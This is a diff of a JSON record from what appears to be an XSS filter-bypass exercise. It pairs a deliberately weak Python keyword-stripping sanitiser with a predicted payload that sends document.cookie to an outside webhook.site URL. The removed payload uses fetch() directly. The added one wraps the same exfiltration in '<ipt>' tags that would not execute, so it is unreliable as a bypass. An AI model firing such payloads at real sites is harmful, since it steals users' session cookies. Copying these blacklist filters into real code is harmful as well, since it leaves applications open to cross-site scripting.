@@ -1,4 +1,4 @@
 {
-  "new_code": "def display_input(payload):\n    # 2단계: <script> 태그만 제거, 나머지는 허용\n    payload = payload.replace('<script>', '').replace('</script>', '')\n    return payload",
-  "predict_result": "fetch('https://webhook.site/cb1ced6a-d9e4-4e6c-993a-7e934a616f84/?cookie='+document.cookie)"
+  "new_code": "def display_input(payload):\n    # 5단계: script, scrscriptipt, scr, javascript, alert, onerror, onload, eval, prompt, confirm, onfocus, onclick, onchange, onsubmit 등 다양한 변종 키워드와 이벤트 핸들러를 필터링\n    import re\n    keywords = [\n        r'script', r'scrscriptipt', r'scr', r'javascript', r'alert', r'onerror', r'onload',\n        r'eval', r'prompt', r'confirm', r'onfocus', r'onclick', r'onchange', r'onsubmit',\n        r'fetch', r'src', r'data', r'iframe', r'img', r'body', r'input', r'form', r'embed', r'object', r'applet', r'link', r'style', r'base', r'meta', r'frame', r'frameset', r'xml', r'xss'\n    ]\n    for keyword in keywords:\n        payload = re.sub(keyword, '', payload, flags=re.IGNORECASE)\n    return payload",
+  "predict_result": "<ipt>('https://webhook.site/7f57acd2-d743-4eef-8a5d-29d406228572/?cookie='+document.cookie)</ipt>"
 }
